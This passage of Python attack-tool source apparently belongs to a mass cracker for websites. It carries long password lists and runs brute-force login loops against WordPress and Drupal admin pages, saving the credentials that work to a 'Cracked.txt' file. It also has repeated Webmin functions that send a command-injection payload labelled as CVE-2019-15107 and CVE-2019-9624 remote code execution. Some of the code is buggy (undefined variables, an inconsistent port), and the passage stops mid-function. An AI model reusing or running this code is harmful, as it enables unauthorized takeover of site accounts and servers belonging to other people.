'zaq123', 'jonny123', 'mafalda', 'wordpass', '147852369', 'greengreen', '123123a', '122333', '852456', 'poiu0987', 'mathews', '192837', '12345qaz', 'bridges', '321', 'charlie1', 'maverick', 'password@123', 'thx1138', 'happy1', 'nester', '111213', '123456q', 'chester', 'adminuser', 'george1', 'qweasdzx', '753951', 'gfhjkm21', '12312', '135792468', '100200300', '1234567q', '112233aa', 'jamal', 'admin12345678', '789456123', 'killer123', 'abcdef', 'm1m2m3m4', 'qazxsw123', 'hacker', 'megamanx', 'cyber', 'baby12', 'trinity1', '12345687', 'aa112233', '11051984', 'benjamin1', 'houston1', 'carpet', 'anaconda', 'studio', '1020304050', 'open', 'zerocool', 'europa', '11235813', '444444', 'asdfghjkl;', 'polopolo', 'monkey', 'andres', 'aaaa', 'system', 'divine', '3edc4rfv', 'hakeem', 'p4ssword', '20102010', '786786', 'hawaii50', 'jennifer1', 'mercedes', 'marlboro', 'tester123', 'phoenix', 'xiaochao', '112358', '321654987', 'devil', 'elephant', 'grades', 'armani', 'hello1234', '0987654321', '1q2w3e*', 'charlie', 'nonenone', '1235123', 'test12', 'hahaha', '654123', 'qwerty12', '101010101', '000', '10071007', '15963', 'blabla', 'q2w3e4r5', 'a123456a', 'mario', 'expert', '1598753', 'qazwsx1234', 'gloria', '323232', 'john123', 'rootroot', 'hej123', 'california', 'spitfire', 'mama', 'hercules', 'ghjuhfvvf', '3216732167', 'enterprise', 'tomtom', 'secure', 'blessed1', 'fgfgfg', 'hal9000', '789456', 'akvamarin', 'hoilamgi', 'super', 'training', 'jonathan', 'martin', 'gogogo123', 'daidai', 'jessica', '1234567899', 'mypass', 'blablabla', 'pokemon', '31071997', 'istanbul', 'my2girls', 'prince', '1qw23er4', 'jermaine', '1123581321', 'graphics', '753159', 'titanic', 'aladin', 'jan', '11111', 'jackson', 'india@123', 'syracuse', 'login123', '1z2x3c', '12348765', 'maria', 'heyhey1', 'speed123', 'qwert123', 'pacific', 'enigma', 'guest', 'master11', 'asdzxc', '334455', '987987', 'leonardo', 'qaz123wsx', 'joe123', 'fandango', 'panama', 'desperado', 'freedom', 'samsung', 'starcraft', 'business', 'rush2112', 'dupa123', 'm123456789', 'badgers', '123abc123', 'solution', 'duisburg', 'joe', 'qwert', 'qwerasdf', 'gabriel1', 'personal', 'admin@1234', '19791979', '112233445566778899', 'blue123', 'webber', '1a2b3c', 'ab123456', 'password7', 'genesis', 'leandro', '1029384756', 'element', 'maxwell', 'please', 'milhouse', 'abcde12345', '12345qwerty', 'network1', '1233', 'iloveyou', 'kolobok', 'qwertyui', 'memorex', 'trigger', 'qqwwee', 'yahoo', 'penelope', '99998888', 'q', 'remember', 'jesuschrist', 'metallica', 'apples', 'qazxswedc', '100100', 'linkin', '2222', '19771977', 'fitness', 'admin123!', '898989', 'jessica1', 'esperanza', 'fatima', 'password1!', '1236987', 'andrea', 'titanic1', 'marketing', 'asd456', '123000', 'a12345678', 'superpass', 'kashmir', 'question', 'hallo', 'italia', 'scooter', '696969', 'natalie', 'catchmeifyoucan', 'pass321', '012345', 'andromeda', 'ripper', 'admin1234567', '369258', 'weare138', 'flamengo', 'agent007', '123qwer', '3333', 'gogogo', 'pass007', 'p@ssw0rd123', 'bobmarley', '456123', '19821982', 'asdf;lkj', 'fuck', '123ewq', 'qwe12345', '23232323', '12qw12qw', 'huang123', '999999999', 'chelsea1', 'norwich', 'asdfg', 'hamster', '1101', 'batman', 'mike123', '123lol123', 'felix', 'sherlock', '99887766', 'daredevil', 'toor', 'ironmaiden', 'passion', 'route66', 'tasha123', 'junior', 'liberta', 'jesus777', 'admin@123456', 'global', 'goldberg', 'goodday', '789123', 'catch22', 'london', 'kawasaki', 'favorite', '100200', '12061986', 'abrakadabra', 'dickie', '172839', 'pepper', 'thailand', 'a1a2a3a4a5', 'maximum', 'Welkom01', 'masterkey', 'prolinea', 'zxcv123', '22121987', 'metro', 'cascade', '123456..', 'jazz', 'anakin', 'ronaldo', '1qaz', 'testing1', '123456789@', 'natasha', 'netscape', '123098', 'mypassword', 'letmein22', 'aaaaaaa', 'qawsed', 'houdini', 'xxxxxx', 'whatever1', 'zxcv', 'aardvark', 'clemson', 'asdfgh01', 'victor', 'awesome1', 'compaq', 'werdna', 'password.', '424242', '123test123', '7654321', '123451', 'helmet', '123qwe123qwe', 'aaa111', '1111111111', '778899', 'evolution']
            for password in passlist:
                password = password.strip()
                try:
                    cj = cookielib.CookieJar()
                    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                    login_data = urllib.urlencode({'log': user, 'pwd': password})
                    opener.open(str(url) + '/wp-login.php', login_data)
                    resp = opener.open(str(url) + '/wp-admin')
                    final = resp.read()
                    if '<li id="wp-admin-bar-logout">' in final:
                    	print('[WordPress] '+url+' ||'+user+'||'+password+'|| \033[0;37;42mSuccess!')
                        with open('Result/Cracked.txt', 'a') as myfile:
                            myfile.write(url+'/wp-login.php#' + user + '#' + password + '\n')
                        break
                    else:
                        print('[WordPress] '+url+' ||'+user+'||'+password+'|| \033[0;37;41mFailed!')
                        
                except:
                	print('[WordPress] '+url+' ||'+user+'||'+password+'|| \033[0;37;41mFailed!')
                	pass
        except:
            pass

    def Drupal(self, url):
        passlist = ['admin', 'pass', '123456', 'admin123', 'admin@123', 'password', '123', '123123', '12345', 'gimboroot', '123456789', 'admin1234', 'a', '1234', 'blah', '1', 'demo', 'adminadmin', 'changeme', '12345678', 'pass123', 'p@ssw0rd', 'hello', '1q2w3e4r', 'test', 'admin!@#', '1qaz2wsx', 'test123', 'admin321', 'admin888', 'admin12345', 'admin123456', 'password123', 'q1w2e3r4', 'abc123', 'temporal', 'admin1', '123mudar', 'password1', '123qwe', 'test1234', 'majordomo', '1q2w3e4r5t', 'root', '1234567', 'welcome123', '159753', '@dm1n', 'adminpass', '111111', 'admin12', 'qwe123', '1234567890', 'abcd1234', 'condor', '1qazxsw2', 'pass12345', 'zaq12wsx', '123321', 'asdf1234', 'nimda', '123654', '12qwaszx', 'passw0rd', 'foo', 'admin!@', 'pass1234', '111', '102030', 'qwerty', '1111', 'asdasd', '1234qwer', 'freedom123', '0000', 'letmein', '88888888', 'bismillah', '1q2w3e', 'romario', 'a1b2c3d4', '02071976', 'wordpress123', 'hello123', '112233', 'wordpress', 'q1w2e3r4t5', 'admin_123', 'liverpool', 'secret', '123123123', 'password1234', 'qazwsx123', '1qaz2wsx3edc', '123450', '987654321', '123qweasd', 'q1w2e3', 'qwerty123', 'welcome', 'pa55word', 'demo123', '1qazxsw23edc', '111111a', 'temp123', '12061988', 'qazwsx', 'p4ssw0rd', '123456a', 'pa55w0rd', 'admin2', 'administrator', 'qwerty99', 'qwer1234', 'q1w2e3r4t5y6', 'qwerty12345', '123789', '!qaz@wsx', 'admin54321', 'abc12345', '000000', 'changeme123', '121212', '!', 'indonesia', 'passpass', '1234abcd', '1q2w3e4r5t6y', '00', 'lol', 'a1s2d3f4', 'webmaster', 'adm1n', 'adminadmin123', '102102102', 'letmein123', '08101979', 'testtest', 'pass@word1', 'adminadminadmin', '11223344', 'temp1234', 'admindemo', 'asdqwe123', '123698', '111111111111', '12341234', 'blog123', 'asd123', 'password12345', 'master', 'google123', '1a2b3c4d', 'qweasd123', '123qwe123', '123qweasdzxc', '12qw34er', 'wpadmin', 'parola', 'testing', 'admin!', 'pass@123', '1qa2ws3ed', 'superadmin', 'super123', 'asdasd123', 'huanhuan', 'aa123456', 'a123456', '10203040', 'qaz123', '120120', 'p@$$w0rd', 'denis123', 'f00tball', 'welkom01', 'justin', '12', 'chelsea', '147896325', '101010', '123abc', 'rootwp', 'pa$$w0rd', 'temppass', 'asd', '010203', 'p@ssword', 'success1', 'qweasdzxc', 'cougar', 'adminpassword', 'admin4321', '19861986', 'admins', 'aaaaaa', 'haha1234', '321321', 'asdf', '010173', '12312312', 'qwerty777', '@dmin', 'computer', 'default', '19831983', 'porsche911', 'admin777', 'katie123', 'welcome1', 'wolf', 'demodemo', '142536', '00000000', '090909', '666666', '159357', 'a1234567', '654321', '11111111', 'paradise', 'access123', 'digital', '87654321', 'qwerty1234', 'leo', 'a1b2c3d4e5', 'newpassword', 'qazwsxedc', 'torero', '1111111', 'formula', 'start123', '0okm9ijn', 'password01', 'teste', 'mmmmm', 'happy123', 'qweqwe', 'senha123', 'passwort', 'banana', 'rahasia', '111111q', '55555', 'azertyuiop', 'asdfasdf', '123admin', '213243', 'trustno1', 'admin123123', 'yellow5', 'aa', '11', 'bond007', '123654789', 'access', '!qazxsw2', 'india123', 'arsenal1', 'nopass', '1z2x3c4v5b', 'abc123456', '14531453', 'admin_pass', 'simsim', 'azerty123', 'creative', 'zaq1xsw2', '147258369', 'haslo123', 'temp', '1122334455', 'internet', '888888', 'wedding', 'newpass', '13579246810', 'pppppppp', 'apple123', 'tester', 'password13', '114477', '123457', '7777777', '147852', 'taekwondo', 'temporary', '123456789a', 'password01!', 'landmark', 'website', 'wordpress1', '12345670', 'p0o9i8u7', 'fuckyou2', '1234567a', '1million', 'a123456789', 'pakistan', 'jordan23', '12344321', '235689', 'volcom', 'ali123', 'jesus123', '741852963', 'deniska', 'test12345', 'manager', '1112131415', 'banana11', '151515', 'dantheman', 'blink182', '147258', 'cronos', 'zxcasdqwe123', 'apple', 'dexter', 'motdepasse', 'matrix', 'topsecret', '963963', 'blog', 'pa$$word', 'P@ssw0rd', 'xxx1234', 'root123', 'monkey123', 'maker', 'admin@321', '159951', '1qazzaq1', '1234560', 'qazxsw', '222222', 'asdf123', 'azerty', '1478963', '123456aa', 'tiger', 'mohammed', 'aaa', '252525', 'testpass', 'qqqqqqqq', 'pass1', '123qwerty', '2345', 'sandra', 'priest', 'admin21', 'kamikaze', '123stella', 'jochen', 'hack', 'abcd', 'ganteng', 'reset123', 'a12345', 'goldstar', '123456abc', 'gfhjkm', 'master12', 'qwerty123456', 'test1', 'aq1sw2de3', '1234asdf', 'qazwsx12', 'blogadmin', '202020', 'admin345', 'matthew1', 'download', 'qwert12345', '210877', 'geheim', 'money123', '123465', 'testing123', 'mercury1', 'anthony1', '071073', 'online123', 'eminem', 'user', 'hackers', '1q2w3e4r5', 'passwd', 'sunshine', 'qwertyuiop', '14789632', 'hacked', 'pass12', 'daniel', '123456123', 'xxx123', 'abcd123', 'wachtwoord', 'asdfgh', '123456qwerty', 'john316', '1313', '1q2w3e4r5t6y7u8i', 'success', 'babylon', 'vagrant', 'marino13', 'qwerty5', 'general', 'champ123', '1230', 'soccer77', 'chris123', 'nirvana', '54321', '131284', 'qwaszx', 'fox', 'diablo', '111222', 'swordfish', 'bluemoon', 'dragon', 'adam', 'alpha', '888999', '11011011', 'aaaabbbb', 'barcelona', '4r3e2w1q', '789789', 'minimum', 'welkom', 'password2', 'online', '7895123', '12121212', '134679', 'chicago1', '951753', 'mike', '12345qwert', 'p455w0rd', '123321123', 'administrator1', '555555', 'computer1', 'karlita', 'oicu812', 'password!', 'myadmin', 'cantrell', 'qw12qw12', 'admin0', 'yankees1', 'drowssap', '112233445566', 'pippo', 'adidas', 'qwe123qwe', 'abc@123', 'philips', 'ecuador', 'qwe123qwe123', 'asdasd12', 'user123', 'lindsey', '1234566', 'ghjcnjgfhjkm', 'qqq111', '114466', 'romeo123', '123qaz', '2013', '1048', '0123456', 'livestrong', '12301230', 'monroe', '232323', '01020304', '13579', 'alessandro', 'change', '11112222', '12369874', 'blahblah', 'zxcv1234', '159159', '1212', '1qay2wsx', 'maradona', 'school', '131313', 'logitech', 'nikita', 'australia', 'a1s2d3', 'qwerty1', 'abc', 'esteban', 'lol123', 'qwe123123', '010101', 'letmein1', 'david', 'power', 'gallery', 'alex123', '456852', 'okinawa', 'google', 'fantom', 'mustafa', '12131415', '123456@@', 'qazwsxedc123', 'shalom', 'designer', 'amsterdam', 'surfing', 'cinema', '123456@', 'support', '1a2s3d4f', 'zxasqw12', 'satan666', '9999', '212121', 'green123', 'chocolate', '050987', '123123aa', 'burrito', 'pirate', 'qqqqqq', 'holahola', '1q2w3e4r5t6y7u', 'adminka', 'superman', 'gustav', 'antony', 'asdasdasd', 'basketball', '200808', 'asdfghjkl', 'cocacola', 'security', '147147', 'serenity', 'sasasa', 'power123', 'jasmine1', '123456987', 'creative1', 'liverpool1', 'santiago', '12345qwe', '1231', '1235', '111222333', 'password11', '171717', 'admin666', 'a1b2c3', '007007', '963852', '31415926', 'moomoo', 'hejhej123', 'jackson1', 'azsxdcfv', '1234321', 'yjdsqgfhjkm', '!@', '2112', 'p@ssword1', 'alex', '1234rewq', 'star123', 'freedom1', '1234512345', '0123456789', '456789', 'hjccbz', '1453', 'asasas', 'password12', 'admin@2014', 'gabriel', 'xxx', '12345600', '123asd', 'lalala', '0915', 'qweqweqwe', 'showtime', 'behappy', 'design', '12345678910', 'devil666', 'password99', '123321a', 'matt123', 'magicman', '121314', 'msconfig', '12345q', 'nopassword', '1z2x3c4v', 'ferrari', 'merlin123', 'q123456', '123456ab', 'q1234567', '1234554321', 'robert', 'site', 'william1', 'cantona7', '1qaz1qaz', 'orange', 'monika', 'qweqwe123', 'aaron', 'backspace', 'maximus', 'ilovejesus', 'adrian', '123654123', '16121988', 'cambiami', '123455', 'master007', '1352', 'hola', '135790', 'catcher', 'michael', 'qweasd', 'ncc1701e', 'zaq123', 'jonny123', 'mafalda', 'wordpass', '147852369', 'greengreen', '123123a', '122333', '852456', 'poiu0987', 'mathews', '192837', '12345qaz', 'bridges', '321', 'charlie1', 'maverick', 'password@123', 'thx1138', 'happy1', 'nester', '111213', '123456q', 'chester', 'adminuser', 'george1', 'qweasdzx', '753951', 'gfhjkm21', '12312', '135792468', '100200300', '1234567q', '112233aa', 'jamal', 'admin12345678', '789456123', 'killer123', 'abcdef', 'm1m2m3m4', 'qazxsw123', 'hacker', 'megamanx', 'cyber', 'baby12', 'trinity1', '12345687', 'aa112233', '11051984', 'benjamin1', 'houston1', 'carpet', 'anaconda', 'studio', '1020304050', 'open', 'zerocool', 'europa', '11235813', '444444', 'asdfghjkl;', 'polopolo', 'monkey', 'andres', 'aaaa', 'system', 'divine', '3edc4rfv', 'hakeem', 'p4ssword', '20102010', '786786', 'hawaii50', 'jennifer1', 'mercedes', 'marlboro', 'tester123', 'phoenix', 'xiaochao', '112358', '321654987', 'devil', 'elephant', 'grades', 'armani', 'hello1234', '0987654321', '1q2w3e*', 'charlie', 'nonenone', '1235123', 'test12', 'hahaha', '654123', 'qwerty12', '101010101', '000', '10071007', '15963', 'blabla', 'q2w3e4r5', 'a123456a', 'mario', 'expert', '1598753', 'qazwsx1234', 'gloria', '323232', 'john123', 'rootroot', 'hej123', 'california', 'spitfire', 'mama', 'hercules', 'ghjuhfvvf', '3216732167', 'enterprise', 'tomtom', 'secure', 'blessed1', 'fgfgfg', 'hal9000', '789456', 'akvamarin', 'hoilamgi', 'super', 'training', 'jonathan', 'martin', 'gogogo123', 'daidai', 'jessica', '1234567899', 'mypass', 'blablabla', 'pokemon', '31071997', 'istanbul', 'my2girls', 'prince', '1qw23er4', 'jermaine', '1123581321', 'graphics', '753159', 'titanic', 'aladin', 'jan', '11111', 'jackson', 'india@123', 'syracuse', 'login123', '1z2x3c', '12348765', 'maria', 'heyhey1', 'speed123', 'qwert123', 'pacific', 'enigma', 'guest', 'master11', 'asdzxc', '334455', '987987', 'leonardo', 'qaz123wsx', 'joe123', 'fandango', 'panama', 'desperado', 'freedom', 'samsung', 'starcraft', 'business', 'rush2112', 'dupa123', 'm123456789', 'badgers', '123abc123', 'solution', 'duisburg', 'joe', 'qwert', 'qwerasdf', 'gabriel1', 'personal', 'admin@1234', '19791979', '112233445566778899', 'blue123', 'webber', '1a2b3c', 'ab123456', 'password7', 'genesis', 'leandro', '1029384756', 'element', 'maxwell', 'please', 'milhouse', 'abcde12345', '12345qwerty', 'network1', '1233', 'iloveyou', 'kolobok', 'qwertyui', 'memorex', 'trigger', 'qqwwee', 'yahoo', 'penelope', '99998888', 'q', 'remember', 'jesuschrist', 'metallica', 'apples', 'qazxswedc', '100100', 'linkin', '2222', '19771977', 'fitness', 'admin123!', '898989', 'jessica1', 'esperanza', 'fatima', 'password1!', '1236987', 'andrea', 'titanic1', 'marketing', 'asd456', '123000', 'a12345678', 'superpass', 'kashmir', 'question', 'hallo', 'italia', 'scooter', '696969', 'natalie', 'catchmeifyoucan', 'pass321', '012345', 'andromeda', 'ripper', 'admin1234567', '369258', 'weare138', 'flamengo', 'agent007', '123qwer', '3333', 'gogogo', 'pass007', 'p@ssw0rd123', 'bobmarley', '456123', '19821982', 'asdf;lkj', 'fuck', '123ewq', 'qwe12345', '23232323', '12qw12qw', 'huang123', '999999999', 'chelsea1', 'norwich', 'asdfg', 'hamster', '1101', 'batman', 'mike123', '123lol123', 'felix', 'sherlock', '99887766', 'daredevil', 'toor', 'ironmaiden', 'passion', 'route66', 'tasha123', 'junior', 'liberta', 'jesus777', 'admin@123456', 'global', 'goldberg', 'goodday', '789123', 'catch22', 'london', 'kawasaki', 'favorite', '100200', '12061986', 'abrakadabra', 'dickie', '172839', 'pepper', 'thailand', 'a1a2a3a4a5', 'maximum', 'Welkom01', 'masterkey', 'prolinea', 'zxcv123', '22121987', 'metro', 'cascade', '123456..', 'jazz', 'anakin', 'ronaldo', '1qaz', 'testing1', '123456789@', 'natasha', 'netscape', '123098', 'mypassword', 'letmein22', 'aaaaaaa', 'qawsed', 'houdini', 'xxxxxx', 'whatever1', 'zxcv', 'aardvark', 'clemson', 'asdfgh01', 'victor', 'awesome1', 'compaq', 'werdna', 'password.', '424242', '123test123', '7654321', '123451', 'helmet', '123qwe123qwe', 'aaa111', '1111111111', '778899', 'evolution']
        Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

        for password in passlist:
            password = password.strip()
            try:

                lib = requests.session()

                Getcsrf = lib.get(url + '/?q=user',timeout=7)

                # Get Token
                Token1 = re.findall('"form_build_id" value="(.*?)" />', Getcsrf.content)
                Token2 = re.findall('type="hidden" name="form_id" value="user(.*?)" />', Getcsrf.content)
                Token3 = re.findall('id="edit-submit" name="op" value="(.*?)" class="', Getcsrf.content)
                Token4 = re.findall('name="op" id="edit-submit" value="(.*?)" class="', Getcsrf.content)

                # Data Tokens

                Tokenk = []
                Tokenk.append(Token3)
                Tokenk.append(Token4)

                for tok3 in Tokenk:
                    tok3 = tok3
                    for tok4 in tok3:
                        Tokens = tok4
                # You Can add Any User u Want ^^

                user = 'admin'
                bdaa0x = {'name': user,
                       'pass': password,
                       'form_build_id': Token1[0],
                       'form_id': 'user' + str(Token2[0]),
                       'op': Tokens
                       }

                req = lib.post(url + '/?q=user', data=bdaa0x, headers=Headers,timeout=7)


                if '"user/logout"' in req.content:
                	print('[Drupal] '+url+' ||'+user+'||'+passwd+'|| \033[0;37;42mSuccess!')
                	open('Result/Cracked.txt', 'a').write(url + '/?q=user' + '#' + Users + '#' + passwd + '\n')
                else:
                    print('[Drupal] '+url+' ||'+user+'||'+passwd+'|| \033[0;37;41mFailed!')
                    

            except:
            	print('[Drupal] '+url+' ||'+user+'||'+passwd+'|| \033[0;37;41mFailed!')
                pass


class Webmin:

	def Webmin1920(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.920 RCE CVE 2019-15107{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.920 RCE CVE 2019-15107{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin1920B(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.920 RCE CVE 2019-15107 Bypass{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.920 RCE CVE 2019-15107 Bypass{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin2(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.920 Unauthenticated RCE{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.920 Unauthenticated RCE{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin22(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.920 Unauthenticated RCE 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.920 Unauthenticated RCE 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin3(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.900 RCE CVE 2019-9624{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.900 RCE CVE 2019-9624{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin32(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.900 RCE CVE 2019-9624 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.900 RCE CVE 2019-9624 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin33(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.900 RCE CVE 2019-9624 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.900 RCE CVE 2019-9624 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin34(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
			hhh = {				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Referer': url+':10000/session_login.cgi',
				'Cookie': 'redirect=1; testing=1; sid=x',
				'Connection': 'close',
				'Upgrade-Insecure-Requests': '1',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': '47'
			}
			command = ('uname -a')
			payload = 'user=root&pam=&expired=2&old=id|'+ command +'&new1=wheel&new2=wheel'
			r = requests.post(asdria, data=payload, headers=hhh, verify=False)
			if r.status_code == 200 and 'Failed to change password : The current password is incorrect' in r.content:
				print('[Webmin] {}{}{} ||{}Webmin 1.900 RCE CVE 2019-9624 4{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(url+':10000:'+'\n')
			else:
				print('[Webmin] {}{}{} ||{}Webmin 1.900 RCE CVE 2019-9624 4{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Webmin4(self, url):
		try:
			boole = url+':1000'
			asdria  = '{}/password_change.cgi'.format(boole)
